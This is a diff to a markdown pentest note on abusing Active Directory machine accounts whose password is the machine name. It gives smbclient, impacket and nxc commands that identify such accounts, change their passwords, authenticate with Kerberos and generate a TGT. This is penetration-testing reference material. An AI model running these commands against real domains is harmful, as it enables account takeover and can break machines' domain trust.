@@ -1,5 +1,5 @@
 ___
-##  TL;DR:
+## TL;DR:
 
 ### Identify
 
@@ -35,7 +35,10 @@ smbclient.py domain/machinename\$:machinename@dc-ip
 ```
 Expected output: `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`
 
-### Exploit
+## Exploit
+
+
+### Option 1: Change password
 
 !!! alert "Note"
 	this is semi-destructive, you're changing the machine password, may require the object be rejoined to the domain
@@ -48,4 +51,18 @@ impacket-changpasswd.py domain/machinename\$:machinename@dc-ip -newpass <pass>
 or
 ```bash
 nxc smb <dcip> -u machinename$ -p 'machinename' -M change-password -o NEWPASS=NewPassword
+```
+
+
+### Option 2: Use kerberos auth
+
+No need to change the password if you use kerberos auth!
+
+```bash
+nxc smb <ip> -u machinename$ -p machinename -k
+```
+
+Grab the tgt for use with other tools.
+```bash
+nxc smb <ip> -u machinename$ -p machinename -k --generate-tgt ticket
 ```
